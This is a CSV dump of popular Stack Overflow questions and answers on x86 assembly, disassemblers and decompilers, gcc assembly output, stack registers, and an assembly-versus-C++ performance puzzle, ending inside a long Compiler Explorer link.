title,viewcount,title,body,body,acceptedanswerid
"Is it possible to ""decompile"" a Windows .exe? Or at least view the Assembly?","362538","","<p>A friend of mine downloaded some malware from Facebook, and I'm curious to see what it does without infecting myself. I know that you can't really decompile an .exe, but can I at least view it in Assembly or attach a debugger? </p>

<p>Edit to say it is not a .NET executable, no CLI header.</p>
","<p>With a <strong>debugger</strong> you can step through the program assembly interactively.<br />
With a <strong>disassembler</strong>, you can view the program assembly in more detail.<br />
With a <strong>decompiler</strong>, you can turn a program back into partial source code, assuming you know what it was written in (which you can find out with free tools such as <a href=""http://www.aldeid.com/wiki/PEiD"" rel=""nofollow noreferrer"">PEiD</a> - if the program is packed, you'll have to unpack it first OR <a href=""http://ntinfo.biz/index.html"" rel=""nofollow noreferrer"">Detect-it-Easy</a> if you can't find PEiD anywhere. DIE has a strong developer community on <a href=""https://github.com/horsicq/Detect-It-Easy"" rel=""nofollow noreferrer"">github</a> currently).</p>

<h3>Debuggers:</h3>

<ul>
<li><a href=""http://www.ollydbg.de/"" rel=""nofollow noreferrer"">OllyDbg</a>, free, a fine debugger, for which you can find numerous user-made plugins and scripts to make it all the more useful.</li>
<li><a href=""http://www.microsoft.com/whdc/devtools/debugging/default.mspx"" rel=""nofollow noreferrer"">WinDbg</a>, free, a quite capable debugger by Microsoft. WinDbg is especially useful for looking at the Windows internals, since it knows more about the data structures than other debuggers.</li>
<li><a href=""https://reverseengineering.stackexchange.com/q/1445"">SoftICE</a>, SICE to friends. Commercial and development stopped in 2006. SoftICE is kind of a hardcore tool that runs beneath the operating system (and halts the whole system when invoked). SoftICE is still used by many professionals, although might be hard to obtain and might not work on some hardware (or software - namely, it will not work on Vista or NVIDIA gfx cards).</li>
</ul>

<h3>Disassemblers:</h3>

<ul>
<li><a href=""http://www.hex-rays.com/idapro/"" rel=""nofollow noreferrer"">IDA Pro</a>(commercial) - top of the line disassembler/debugger. Used by most professionals, like malware analysts etc. Costs quite a few bucks though (there exists <a href=""https://www.hex-rays.com/products/ida/support/download_freeware.shtml"" rel=""nofollow noreferrer""><strong>free version</strong></a>, but it is quite quite limited)</li>
<li><a href=""http://www.softpedia.com/get/Programming/Debuggers-Decompilers-Dissasemblers/WDASM.shtml"" rel=""nofollow noreferrer"">W32Dasm</a>(free) - a bit dated but gets the job done. I believe W32Dasm is abandonware these days, and there are numerous user-created hacks to add some very useful functionality. You'll have to look around to find the best version.</li>
</ul>

<h3>Decompilers:</h3>

<ul>
<li>Visual Basic: <a href=""http://www.vb-decompiler.org/"" rel=""nofollow noreferrer"">VB Decompiler</a>, commercial, produces somewhat identifiable bytecode.</li>
<li>Delphi: <a href=""http://www.softpedia.com/get/Programming/Debuggers-Decompilers-Dissasemblers/DeDe.shtml"" rel=""nofollow noreferrer"">DeDe</a>, free, produces good quality source code.</li>
<li>C: <a href=""https://www.hex-rays.com/products/decompiler/"" rel=""nofollow noreferrer"">HexRays</a>, commercial, a plugin for IDA Pro by the same company. Produces great results but costs a big buck, and won't be sold to just anyone (or so I hear).</li>
<li>.NET(C#): <a href=""http://www.jetbrains.com/decompiler/"" rel=""nofollow noreferrer"">dotPeek</a>, free, decompiles .NET 1.0-4.5 assemblies to C#. Support for .dll, .exe, .zip, .vsix, .nupkg, and .winmd files.</li>
</ul>

<p>Some related tools that might come handy in whatever it is you're doing are resource editors such as <a href=""http://angusj.com/resourcehacker/"" rel=""nofollow noreferrer"">ResourceHacker</a> (free) and a good hex editor such as <a href=""http://www.bpsoft.com/"" rel=""nofollow noreferrer"">Hex Workshop</a> (commercial).</p>

<p><strong>Additionally, if you are doing malware analysis (or use SICE)</strong>, I wholeheartedly suggest running everything inside a virtual machine, namely <a href=""http://www.vmware.com/products/ws/"" rel=""nofollow noreferrer"">VMware Workstation</a>. In the case of SICE, it will protect your actual system from BSODs, and in the case of malware, it will protect your actual system from the target program. You can read about malware analysis with VMware <a href=""http://www.zeltser.com/vmware-malware-analysis/"" rel=""nofollow noreferrer"">here</a>.</p>

<p>Personally, I roll with Olly, WinDbg &amp; W32Dasm, and some smaller utility tools.</p>

<p>Also, remember that disassembling or even debugging <i>other people's</i> software is usually against the EULA in the very least :)</p>
","273248"
"Why aren't programs written in Assembly more often?","250277","","<p>It seems to be a mainstream opinion that assembly programming takes longer and is more difficult to program in than a higher level language such as C. Therefore it seems to be recommend or assumed that it is better to write in a higher level language for these reasons and for the reason of better portability.</p>

<p>Recently I've been writing in x86 assembly and it has dawned on me that perhaps these reasons are not really true, except perhaps portability. Perhaps it is more of a matter of familiarity and knowing how to write assembly well. I also noticed that programming in assembly is quite different than programming in an HLL. Perhaps a good and experienced assembly programmer could write programs just as easily and as quickly as an experienced C programmer writing in C.</p>

<p>Perhaps it is because assembly programming is quite different than HLLs, and so requires different thinking, methods and ways, which makes it seem very awkward to program in for the unfamiliar, and so gives it its bad name for writing programs in.</p>

<p>If portability isn't an issue, then really, what would C have over a good assembler such as NASM?</p>

<p><b>Edit:</b>
Just to point out. When you are writing in assembly, you don't have to write just in instruction codes. You can use macros and procedures and your own conventions to make various abstractions to make programs more modular, more maintainable and easier to read. This is where being familiar with how to write good assembly comes in.</p>
","<p>ASM has <strong>poor legibility</strong> and <strong>isn't really maintainable</strong> compared to higher-level languages.</p>

<p>Also, there are many <strong>fewer ASM developers</strong> than for other more popular languages, such as C.</p>

<p>Furthermore, if you use a higher-level language and <strong>new ASM instructions become available</strong> (SSE for example), you just need to update your compiler and your old code can easily make use of the new instructions.</p>

<p>What if the next CPU has twice as many registers?</p>

<p>The converse of this question would be: <em>What functionality do compilers provide?</em></p>

<p>I doubt you can/want to/should optimize your ASM better than <code>gcc -O3</code> can.</p>
","2684384"
"How do you get assembler output from C/C++ source in gcc?","212566","","<p>How does one do this?</p>

<p>If I want to analyze how something is getting compiled, how would I get the emitted assembly code?</p>
","<p>Use the <code>-S</code> option to gcc (or g++).</p>

<pre><code>gcc -S helloworld.c
</code></pre>

<p>This will run the preprocessor (cpp) over helloworld.c, perform the initial compilation and then stop before the assembler is run.</p>

<p>By default this will output a file <code>helloworld.s</code>. The output file can be still be set by using the <code>-o</code> option.</p>

<pre><code>gcc -S -o my_asm_output.s helloworld.c
</code></pre>

<p>Of course this only works if you have the original source.
An alternative if you only have the resultant object file is to use <code>objdump</code>, by setting the <code>--disassemble</code> option (or <code>-d</code> for the abbreviated form).</p>

<pre><code>objdump -S --disassemble helloworld &gt; helloworld.dump
</code></pre>

<p>This option works best if debugging option is enabled for the object file (<code>-g</code> at compilation time) and the file hasn't been stripped.</p>

<p>Running <code>file helloworld</code> will give you some indication as to the level of detail that you will get by using objdump.</p>
","137074"
"How can I multiply and divide using only bit shifting and adding? ","181585","","<p>How can I multiply and divide using only bit shifting and adding? </p>
","<p>To multiply in terms of adding and shifting you want to decompose one of the numbers by powers of two, like so:</p>

<pre><code>21 * 5 = 10101_2 * 101_2             (Initial step)
       = 10101_2 * (1 * 2^2  +  0 * 2^1  +  1 * 2^0)
       = 10101_2 * 2^2 + 10101_2 * 2^0 
       = 10101_2 &lt;&lt; 2 + 10101_2 &lt;&lt; 0 (Decomposed)
       = 10101_2 * 4 + 10101_2 * 1
       = 10101_2 * 5
       = 21 * 5                      (Same as initial expression)
</code></pre>

<p>(<code>_2</code> means base 2)</p>

<p>As you can see, multiplication can be decomposed into adding and shifting and back again. This is also why multiplication takes longer than bit shifts or adding - it's O(n^2) rather than O(n) in the number of bits. Real computer systems (as opposed to theoretical computer systems) have a finite number of bits, so multiplication takes a constant multiple of time compared to addition and shifting. If I recall correctly, modern processors, if pipelined properly, can do multiplication just about as fast as addition, by messing with the utilization of the ALUs (arithmetic units) in the processor.</p>
","2777225"
"Why doesn't GCC optimize a*a*a*a*a*a to (a*a*a)*(a*a*a)?","176362","","<p>I am doing some numerical optimization on a scientific application. One thing I noticed is that GCC will optimize the call <code>pow(a,2)</code> by compiling it into <code>a*a</code>, but the call <code>pow(a,6)</code> is not optimized and will actually call the library function <code>pow</code>, which greatly slows down the performance. (In contrast, <a href=""http://en.wikipedia.org/wiki/Intel_C++_Compiler"">Intel C++ Compiler</a>, executable <code>icc</code>, will eliminate the library call for <code>pow(a,6)</code>.) </p>

<p>What I am curious about is that when I replaced <code>pow(a,6)</code> with <code>a*a*a*a*a*a</code> using GCC 4.5.1 and options ""<code>-O3 -lm -funroll-loops -msse4</code>"", it uses 5 <code>mulsd</code> instructions:</p>

<pre><code>movapd  %xmm14, %xmm13
mulsd   %xmm14, %xmm13
mulsd   %xmm14, %xmm13
mulsd   %xmm14, %xmm13
mulsd   %xmm14, %xmm13
mulsd   %xmm14, %xmm13
</code></pre>

<p>while if I write <code>(a*a*a)*(a*a*a)</code>, it will produce</p>

<pre><code>movapd  %xmm14, %xmm13
mulsd   %xmm14, %xmm13
mulsd   %xmm14, %xmm13
mulsd   %xmm13, %xmm13
</code></pre>

<p>which reduces the number of multiply instructions to 3. <code>icc</code> has similar behavior.</p>

<p>Why do compilers not recognize this optimization trick?</p>
","<p>Because <a href=""http://en.wikipedia.org/wiki/Floating_point#Accuracy_problems"" rel=""noreferrer"">Floating Point Math is not Associative</a>.  The way you group the operands in floating point multiplication has an effect on the numerical accuracy of the answer.</p>

<p>As a result, most compilers are very conservative about reordering floating point calculations unless they can be sure that the answer will stay the same, or unless you tell them you don't care about numerical accuracy.  For example: <a href=""http://gcc.gnu.org/onlinedocs/gcc/Optimize-Options.html"" rel=""noreferrer"">the <code>-fassociative-math</code> option</a> of gcc which allows gcc to reassociate floating point operations, or even the <code>-ffast-math</code> option which allows even more aggressive tradeoffs of accuracy against speed.</p>
","6430525"
"What is the function of the push / pop instructions used on registers in x86 assembly?","153728","","<p>When reading about assembler I often come across people writing that they <em>push</em> a certain register of the processor and <em>pop</em> it again later to restore it's previous state.</p>

<ul>
<li>How can you push a register? Where is it pushed on? Why is this needed?</li>
<li>Does this boil down to a single processor instruction or is it more complex? </li>
</ul>
","<p><em>pushing</em> a value (not necessarily stored in a register) means writing it to the stack.</p>

<p><em>popping</em> means restoring whatever is on top of the stack <em>into</em> a register. Those are basic instructions:</p>

<pre><code>push 0xdeadbeef      ; push a value to the stack
pop eax              ; eax is now 0xdeadbeef

; swap contents of registers
push eax
mov eax, ebx
pop ebx
</code></pre>
","4584131"
"What's a good C decompiler?","151336","","<p>I am searching for a decompiler for a C program. The binary is a 32-bit x86 Linux executable. Objdump works fine, so basically I am searching for something which attempts to reconstruct the C source from the asm source.</p>
","<p>Seconding Hex-rays, but if you can't justify that cost, <a href=""http://boomerang.sourceforge.net/"" rel=""noreferrer"">Boomerang</a> might work.</p>
","193900"
"What is exactly the base pointer and stack pointer? To what do they point?","134676","","<p>Using <a href=""http://en.wikipedia.org/wiki/Call_stack"" rel=""noreferrer"">this example</a> coming from wikipedia, in which DrawSquare() calls DrawLine(),</p>

<p><img src=""https://upload.wikimedia.org/wikipedia/commons/thumb/d/d3/Call_stack_layout.svg/342px-Call_stack_layout.svg.png"" alt=""alt text""></p>

<p>(Note that this diagram has high addresses at the bottom and low addresses at the top.)</p>

<p>Could anyone explain me what <code>ebp</code> and <code>esp</code> are in this context?</p>

<p>From what I see, I'd say the stack pointer points always to the top of the stack, and the base pointer to the beginning of the the current function? Or what?</p>

<hr>

<p>edit: I mean this in the context of windows programs</p>

<p><strong>edit2: And how does <code>eip</code> work, too?</strong></p>

<p><strong>edit3:</strong> I have the following code from MSVC++:</p>

<pre><code>var_C= dword ptr -0Ch
var_8= dword ptr -8
var_4= dword ptr -4
hInstance= dword ptr  8
hPrevInstance= dword ptr  0Ch
lpCmdLine= dword ptr  10h
nShowCmd= dword ptr  14h
</code></pre>

<p>All of them seem to be dwords, thus taking 4 bytes each. So I can see there is a gap from hInstance to var_4 of 4 bytes. What are they? I assume it is the return address, as can be seen in wikipedia's picture?</p>

<hr>

<p>(editor's note: removed a long quote from Michael's answer, which doesn't belong in the question, but a followup question was edited in):</p>

<p>This is because the flow of the function call is:</p>

<pre><code>* Push parameters (hInstance, etc.)
* Call function, which pushes return address
* Push ebp
* Allocate space for locals
</code></pre>

<p><strong>My question (last, i hope!) now is, what is exactly what happens from the instant I pop the arguments of the function i want to call up to the end of the prolog? I want to know how the ebp, esp evolve during those moments(I already understood how the prolog works, I just want to know what is happening after i pushed the arguments on the stack and before the prolog).</strong></p>
","<p><code>esp</code> is as you say it is, the top of the stack.</p>

<p><code>ebp</code> is usually set to <code>esp</code> at the start of the function. Function parameters and local variables are accessed by adding and subtracting, respectively, a constant offset from <code>ebp</code>.  All x86 calling conventions define <code>ebp</code> as being preserved across function calls.  <code>ebp</code> itself actually points to the previous frame's base pointer, which enables stack walking in a debugger and viewing other frames local variables to work.  </p>

<p>Most function prologs look something like:</p>

<pre class=""lang-none prettyprint-override""><code>push ebp      ; Preserve current frame pointer
mov ebp, esp  ; Create new frame pointer pointing to current stack top
sub esp, 20   ; allocate 20 bytes worth of locals on stack.
</code></pre>

<p>Then later in the function you may have code like (presuming both local variables are 4 bytes)</p>

<pre class=""lang-none prettyprint-override""><code>mov [ebp-4], eax    ; Store eax in first local
mov ebx, [ebp - 8]  ; Load ebx from second local
</code></pre>

<p>FPO or <em>frame pointer omission</em> optimization which you can enable will actually eliminate this and use <code>ebp</code> as another register and access locals directly off of <code>esp</code>, but this makes debugging a bit more difficult since the debugger can no longer directly access the stack frames of earlier function calls.</p>

<p>EDIT:</p>

<p>For your updated question, the missing two entries in the stack are:</p>

<pre class=""lang-none prettyprint-override""><code>var_C = dword ptr -0Ch
var_8 = dword ptr -8
var_4 = dword ptr -4
*savedFramePointer = dword ptr 0*
*return address = dword ptr 4*
hInstance = dword ptr  8h
PrevInstance = dword ptr  0C
hlpCmdLine = dword ptr  10h
nShowCmd = dword ptr  14h
</code></pre>

<p>This is because the flow of the function call is:</p>

<ul>
<li>Push parameters (<code>hInstance</code>, etc.)</li>
<li>Call function, which pushes return address</li>
<li>Push <code>ebp</code></li>
<li>Allocate space for locals</li>
</ul>
","1395646"
"Why is this C++ code faster than my hand-written assembly for testing the Collatz conjecture?","124656","","<p>I wrote these two solutions for <a href=""https://projecteuler.net/problem=14"" rel=""noreferrer"">Project Euler Q14</a>, in assembly and in C++. They are the same identical brute force approach for testing the <a href=""https://en.wikipedia.org/wiki/Collatz_conjecture"" rel=""noreferrer"">Collatz conjecture</a>. The assembly solution was assembled with</p>

<pre><code>nasm -felf64 p14.asm &amp;&amp; gcc p14.o -o p14
</code></pre>

<p>The C++ was compiled with</p>

<pre><code>g++ p14.cpp -o p14
</code></pre>

<p>Assembly, <code>p14.asm</code></p>

<pre><code>section .data
    fmt db ""%d"", 10, 0

global main
extern printf

section .text

main:
    mov rcx, 1000000
    xor rdi, rdi        ; max i
    xor rsi, rsi        ; i

l1:
    dec rcx
    xor r10, r10        ; count
    mov rax, rcx

l2:
    test rax, 1
    jpe even

    mov rbx, 3
    mul rbx
    inc rax
    jmp c1

even:
    mov rbx, 2
    xor rdx, rdx
    div rbx

c1:
    inc r10
    cmp rax, 1
    jne l2

    cmp rdi, r10
    cmovl rdi, r10
    cmovl rsi, rcx

    cmp rcx, 2
    jne l1

    mov rdi, fmt
    xor rax, rax
    call printf
    ret
</code></pre>

<p>C++, p14.cpp</p>

<pre><code>#include &lt;iostream&gt;

using namespace std;

int sequence(long n) {
    int count = 1;
    while (n != 1) {
        if (n % 2 == 0)
            n /= 2;
        else
            n = n*3 + 1;

        ++count;
    }

    return count;
}

int main() {
    int max = 0, maxi;
    for (int i = 999999; i &gt; 0; --i) {
        int s = sequence(i);
        if (s &gt; max) {
            max = s;
            maxi = i;
        }
    }

    cout &lt;&lt; maxi &lt;&lt; endl;
}
</code></pre>

<p>I know about the compiler optimizations to improve speed and everything, but I don't see many ways to optimize my assembly solution further (speaking programmatically not mathematically).</p>

<p>The C++ code has modulus every term and division every even term, where assembly is only one division per even term.</p>

<p>But the assembly is taking on average 1 second longer than the C++ solution. Why is this? I am asking out of mainly curiosity.</p>

<h3>Execution times</h3>

<p>My system: 64 bit Linux on ‎1.4 GHz Intel Celeron 2955U (Haswell microarchitecture).</p>

<ul>
<li><p><code>g++</code> (unoptimized):          avg 1272 ms</p></li>
<li><p><code>g++ -O3</code>        avg 578 ms</p></li>
<li><p>original asm (div)  avg 2650 ms</p></li>
<li><p><code>Asm (shr)</code>  avg 679 ms</p></li>
<li><p><a href=""https://stackoverflow.com/a/40356449/4322363"">@johnfound asm</a>, assembled with nasm avg 501 ms</p></li>
<li><p><a href=""https://stackoverflow.com/a/40367384/4322363"">@hidefromkgb asm</a> avg 200 ms</p></li>
<li><p><a href=""http://gcc.godbolt.org/#z:OYLghAFBqd5QCxAYwPYBMCmBRdBLAF1QCcAaPECAKxAEZTUAHAvVAOwGdK0AbVAV2J4OmAIIcAtiADkABmmk0Exnh6YA8mwDCCAIZtgmGfICUpDgOLIj0gKQAmAMx42yHvywBqW460cC%2BKgAdAg%2B2Layog7Oru5ePn4BLgQhYRFRTi5uHpjevskEAJ6MmBypjuGR6fzJAGwALAD6BJ4iAI78mK6YEDVsBA3NrXgAXpiknn0DTS0AVIy6BAgm3gDsAELpntuTdTOeEroAHnh5ACKeshOHR8jnlz6bVZE7ngBmJJ69e0OnPhcQDijXIAWk8tBWtlWWnBj22fwqnnscM8pxB/yRkI2W1eOymgxabHueEe6WieDeDxeuO2%2BP2dwxyMcT1ENO2AHcEKpclAiRjed57LVPI4TD4AGJfPkVMLgyH2daePkK8GeEBSvLhRH2Ey6zWYnFsnYMhWM0lVJyYHgiQ24ulDBmOC6yc2stnoVBrFlG14Ael9Is8s08GHQ91DE30YYc61oB10AGtSqiWpgAG5dILbADKnqWmGImDA0g4nl0PHZukKpcWnjUun8IbYuTSFTjRE8HrLbwIBbLIrYMdotqNJs2TqRrp9O39ngIyk8ad0xFLFjnCFyShUamInmQ%2BnjBGQCDLkk87MIJ4sgmsBxIuX4Ije/B4PEKI7Z9tTGbYjXTXXuCBpS1bADWZD8ZwDLduVLDsAFl1AANUFRVswACQAJRQzwABlsCialpy/Tx/1/UNAOA2UIWw5VFWHZltlncs13ZEgE1LD5d3zEN0HQP8fz3BtMAgnYRMYqDUGUGC509PDWRjTx0KwoDPQQ5Dm0wLB0DMVo8y5UsJHvEEtzUI4SKORhCw4IF2FRUtj0wXQSi4z103LfhFmEwi2VnAAjfgWnzIluOgnclUwTSayJTAjgIYhdE8NSZNaXQM3XXISDwYAXHLJUJjXQhPF88t9GsUsBAIdJZ2nXZ%2BgJHi%2BNIwCgLyLQEjlGjsJ1TUqJREif0aciMVDfiuinI1Z0Kj1k1QDNiDePh2V09gCwmJYBGABAs08ABVVxJIkLpAs9R8vLdadpQBZVhVFCV%2Bq6QbeLVe7f1I8aaShC5OW5DV9R1V1oi6fA3g/ESKQ1f5GTFbzRxjOHwJhnZwYgR1QJuZAsW9GqbgRC4SQR86fXR%2B5kHe3FPttCnvPmRYTwxdGycLAhBCJHGAdWM4yUiZJ4xcCBMdtYiceuY5SYJ20cfudpOm6CBaFkBXFYmBxanRsUCdeSzkjeCAHGRewAFY9c8AAFDCAEl%2BAaQV7GVw3jbNy3rb12wDa0Qd7Ft%2BMThF251ax7YmZZh5xY5rnRF9WYtjcfRgEcIIAE5i1LPgmHSIIcPWdZZEaRx1RqgujWiHYTeXI7cNQJhPCznP7E8M5MGYUInWHRHtkMtNcWIeWJisI4RI4BBd1eburiRQvi8HGUKmRZ5Cdeesu/QI5lYN9Y%2B662YN4U5EDc5tvWiHpf%2B7no1e0bY0eAmRwRI7rvkBXzxiGXkTkA73JA4f3v5fDo1dCekeCcJiz3nsaBcI8v6TgPlQBKngM411ziJdIxAE7/DQPwfo/wXQMSfg/f4U8zgkkiEEVOjBHpYB/PnQUjgmxvibLkNS20tACB4GGDgqVchLFrBeJY/YFq6GAGoayIJB4UhaBAJSAANc8l49wCH6KiIkCVCzZX8AWaGoDtiLxHsvVe68H6b23iqXe%2B9NGH2HjsZ%2BZk2TFxGm9F4t9Zq4kco/TABjtjF3YWlTK2U2C5SJCxTcB5z6BQ3HWVAS1fKEFLC4dKcjGCFC%2BEsYQdk4lxTwMgBMZZXyBlCgWAywgRDaQHkfCBj866vEnq2LUZw66xMYDwXQ1hf5shCbics19X4dzYCMT%2Bj8rGiScHWTyrg8DJjeMQSSnhLLphTAWdUVj1QmRio0OSMYlJ9PVBs7Y/DgBcESkhGMAAVbA2YjktJpP/MMgDgFdMYPfcpIkYHbBIZXMhoZ7EES%2BSgtB8jKpOmwYqXB/cnQEKIaIV5TBRpsFDCARxncdH9LwQfcmThtGWJ7t4NeRi6KuwuIMmh5ZezED8SwNKHZCzoH4LeRpvZXCJM4k/Ze6oIByWHNCJSYoFRspKRYwOL8D7ov5Y/V2%2BizIKQGQpYce8CVKhotUuMUqLm4jvq8FxEw3EnzMYPPlwLbkHzaa8DpIoumzR6X03uy9ZW0q6MgMZHFJkSGmYWTuhB5lMqOOqNS6zMIxmWUcVZ%2BFtp9y2Zhbauz9neoVCcs5yqjUAMsUAqBZi373LKfqsxzy4GkOhaGcOPynToMwQClEfd8H/HBZ4jh/Ykq%2BUSVuAKLhgBKmqXXCZUyp4gTjICLIuRCDJyVKgFotkQpCBYPuHg0zaYaOLsxPMiZkzcSSqgN4lJR2EAyblBYvDGXlknVoE2O0OD5V7SmJ%2BGCYlEgWPFV8VoZG8O4m8PAK4WhKXTjm0iI1CynUaKInscKD6qssccXuyKzEfTRY5Y%2BeicWwhlbK4gF7FFTpvWoSdPCTzcT/ZVA%2BOqHliVRY4K50HgXTlnTwYlpK8Dks9JS6luQbX0veJ8RZXweUcswly9YogzgXEZMgfKuhDqnkUr6hUSkJgenZESdtTr6ik0FVBxFMGDESuONhaV%2BLZWdrCIqlUtFYSnzZHhsphcfRVOntgL2HpmzIYIKxVovZGCli%2BIx5A74nT/SMzSQ1OxjU3wPm/M1vS9UeutSMu14zHXOtmW64gCzmVvoVP6wNUQnT1GDQ/UNGEfUYXDY0vZXrDnRtOecmGxciAEFyqQ4yy4hCaU7I3PcegXDqnNv0O9aFswAHV1TDgVDfBUdcMS1GQNtdQu5%2BuxhjMNic8myyhM3KgRsK6yzRVivFRRHA2DbXWGcbrvpswAGkcLqgNncT4jgxsjmLmZguog4IXHWC%2BVhqAxjxdhENoc9xzvjcm0Ob7GIrtfELB0Z9yYNlRlwvhZKiGiSxMfc%2Bxs7m3C5F0D2PsG9fJuMksmQs/9CgTAwxVA5yE1HlibZ4bAkjZCt3nrdu7jOmeM5NtydAQg5qHd7EJyZt7dz7iJF2Lh4i4dsEp3fYgDRSCS/qE2TwogADiO1ZC%2BghBMfyLRnuvg9O9wSbBiwpA0YRxSeAJCqGXG%2BCY7XeyTpmSCc2aZCjrzwOgQwXwkpVaTKWWgdwocHhim4xttlGAkAICsQ4iTUDIH3DZPxr5EnY8a40woDW61P1KJYW8aA2ALQyQQY9RUAqHxYWGRPhl/B0KBGbxpLlPBde68Mbo6VEl6DSjQ0QOEj1xr8wmwOSaQGjnAZYyBA%2B2RZshWQz9vFGjfpEL%2BrkPZw5L7ngWs4Rb/lnEBcPkFZwwVkiGVIkUIImAFih7soRq4F8tC8cmJKLh/CIeQCwdgpYIAa/CpFORGCWixOUZgVRxKJg20aEDY7IVok6cOMSP%2BRItA/ATAEwPuwydK7mQQyCtA9EZw9AT8tATItS76byua0%2B6wcE5s9gAG2qQ81iwqoG/S6BEGNCkqE4OmbYBG9BQq2BY8oqsGmmlSQyAu568OV6y4e6d6GGcS2GrBhGxGymHBZGQyRKBYVGNG6eVKNKEWDKLGzKbG%2BE7KWgUiXGPGpiRo7BViMGVqEqqmKoPBHiQyzB2AemioBmdOIkvm2wbgnSuGlB6aoW3cFSvBDBqmTBraROl4JO6ObwbiLABg7wBWHApqaY5qPhVqchNCbm9q7w0WMyrqxK%2BcrGUifqkkDSKyck2%2B2W0iMRAi%2ByMaZW4GzORcQylW1WbytWxA9WYYWA9yx4ugrWng1unWPW6o9QM29wo2f2k4X26Wvui2ciK2lI/uG2CU9%2BO22we2B2x2p2ng52IYu4V2qB3m7SveT8/edyDyGaRo4%2BH6P4I0xBpBy%2Bbo6AyAxUBK0QLxTgrxNCcEVYieYBeukwIgFReyrQmALQaeeGphW23OYYq21REo3eRovICQCQ1ECkThkIlmhmboEoyACsOwg41I2JOJ2wU8bUvgzhKoiscY2wzhTokMNJdJnM9JOIkiNOlJRyG4lEbYQJ%2BengWg4oLSWJvklJcqNhNC5EpEWYvkX%2BrCRUuQsg2xGJHijg4ogpcpRJiJpJ%2B%2BioFJOw1JDJeptJ%2BpNJ1IkiRwvkqpbJAECqe49YK4PJfJRmWJ8suJsqTUea%2BJ8sqpLavgSJmplwCsQpupBpQZjJxpWgdBngFpHJ9hXJpYvJrwAAcifpJqgKUPrtIC0BuDwIwHcf6LmXmfmbma8EBAqvKI4RpjiFiYSS2tSLCUqdibiQqr6dqVSWSIyW2YaUYZ4MycgM4TWXWYKc6SKQ1C9BKVKaXrKfKXToqXyf2Q2ZZmSVqf6Tqa2R2cGfqcaSab5PyXWU6USS6QJKGNtJKRII%2BCCbkN2kOhuMQBeP8YVKxC%2BOOS9C9EbnkDOeKD2XOV2k2UuS2VUO2WuZDBuVoJ6biImSUMmamQbp4JmYwBMALlBVQKeXOKUNMYtEVIVKtskuVLuBYIdMkgYDmQWURQGFyFgLJgmMAL5AOnoGwOgCCOyGOnSqeBIFVMRSsZMkmESNjvuKdKJhhBcPWBmKWOoJKBgmRS4A1mIdhl/golRHsbUYpEJrkIyhhOoFhJ4PxebMAjsBAN9MeJ2CmbBGEuwsJvhc2u/m8A2IAfJekAAAKHCtZMlqUaXZhaUuXmzjQlGaV6IYRaDSJKp7wAzUi2WkLkGvCGHuW3LizeReVnCSI%2BVnDmzYSaWzDDbGJ4pkwbL8XxWwg4KM7FwDJuYMrRbPynA2q7hxZLKFGmSpbYQbIYgZbbAQATbjHTZOjA62QPZnAzreRKQXDeUaWJVRVAopG9EdY8DqjA5FX5TAkcSxHbSJnDrBRhLIBjqbq260yN63hDEVDxzbBdXqjChwTH7ObXx3BFVfCWSoDFS%2BR0K%2BRDoEBqDNiZLlTLWTL8CbSMABQvnbBaBqQ4SDVuXZV9Q1TFwmyFggirHqj2DnXqHyWvB/VITZiA0TDA15Wg1DLg2YCQ37bQ2w3IHvgop1HG6NGTo1b7itFjLtFNZdGxJPXABLBtbjXVz7aHYnaHVjbbB9GTr17qgAAcnN8uj2k1AOCoiqE4WxEAV1N1d1D1T1biCYlOI6Q8G0CAX1LQAYVkme2N2eueT%2BHAPVhMf1JsKNk4GsngAAUqyCFW8kFV8rML6DmbMM7S7a7W7cGCwPgA1vwPcnNLHiGJSKRZgORZRQOpyKgGoHIlgCEQ%2BkPBFJ2BSBEYWAoi4M2LuKQqWO7Vna7cqqSAxEcqbk2g6lMglMwoWPYGcHAVTrULUDiRAPYEEPUArmhCMDpHBAWFMmbqtagMuMeG6k/oIJgNtCjNVTFCCCURiIgdNTyd6hOHXHAc5veieDDUgbaoUIbZUuBAxG1KaCqCwGbgYK/mIRIPWvWM2HRT7YuPkqwESJhWEjCMLmWAPXuvWoUdJNjgQIAVzKglvYqFoI0gYPHHzZ4CCOoDQiCIcFYM3LvosNRkYJ4PUHzXXBIKWDGL6GCLIEEINgbMxruDg4WM5t/XnYqMANHgbEEBUqA%2BA5A8ePgrAxmGdo4HzSgyhOg5cEELIEMYbDsp8Pg43HEfscQzKY2DRXRczOfcxVfSuDfeqKpVhFDm0txFyJtOPFEvnoMY4Dgyw4ynw4Q3PN/YItdblL%2BlVsQDhqICY8uAQOQREAnBLrQI4OgAgekPvU2jPo3I5NY%2BkElJgH5QgYrIrHbbY1gHcJqt/VDpqhMCCCArY0cJ8JgL5LBSRIk9/XE7uAk64r5Fqt/fYwbE4yas8AnIPBAbQAbBMLUH4XCN3DgxiLIIKR6Zg0EFmLU7cIrE0zZb/R3ubArvGeCMKIqeOIqDBUZS2J7GhUVcbKQnLu3Y6ttNmAgCXmmRmYIEtWtoUGZXZQ5WwDY7IAnJIs5aUHgBqkCN/SUZgENViusL5f5VYRlX%2BYM/LjhN0707QMKFeX2qWKxCuJwjRYOmZbg4lB3SxRaAbODC6MQpcV0F%2BpgD%2BthlQkI2XZgHXDM1MvXY3c3a3dsPUBUwcK/jo%2Bns5j9Sqk4iPCBkyuCmZo8CYbopc6VeWfBgMwIZeihiIehrIlhlfrykvEcwqRPMyNIZYjS3S%2BZgxAoSSvQ5wrRppPRqvUxoyqxqyjoVCHoZxjGBFfxoJsJg2HxblsmdJhkVMvJiJNSyKtivgNhPFOKrcwy4y3YQ4XKkqvsa8CZoKzy0KflQxHYdZitHZg5moova5uof8F5l8mfChe0lfAUymt0iFqVZalQXCGkVFlMlkXMh9osklusClmsulsGvgNlrlvlpUUVohMcqVjdgxKTeEkwC0W0Y1p0S1ts2NTbnXgMZ9usINusLNhcKMdsC1VNlNt2wg1MXEmgLMWtuZHFIsZwMsSzWsezZsRdjsdduVujcTTsF1dXC9jru6oO4DhLYLf26LbGPcMDhAKDjUFZHxWtmGCURShgnZmEk%2Bi%2BnuIUKjt2MSuSzKUoHjo5OgITkvSTklOTjwJTtTrThWyNeu9B8TazmoOznA8QFzo5BILzmFPwULnoCLhgmLtERLlLjLnLorsrqrjpO/lrq9rrvBemUEES3kKhIXTXpbs23enbg7k7kIK7jyB7gut7r7rRROwHsgEHleqHuHlWCGNHg2DfS/TKUnlWKnoklrTeEtjnqB/rerkXoPCXnJ%2BXo9YklXubrXvXltT85gC3tWu3p3gI6G2yAK9sIc2cWyKmty05zSBcQQVPnxLPpgPPmIvvgbFaODL2WloM3CNmGwOsCCBMmMrRXQnrItCCBM57PnIq6ILoZymq7xvC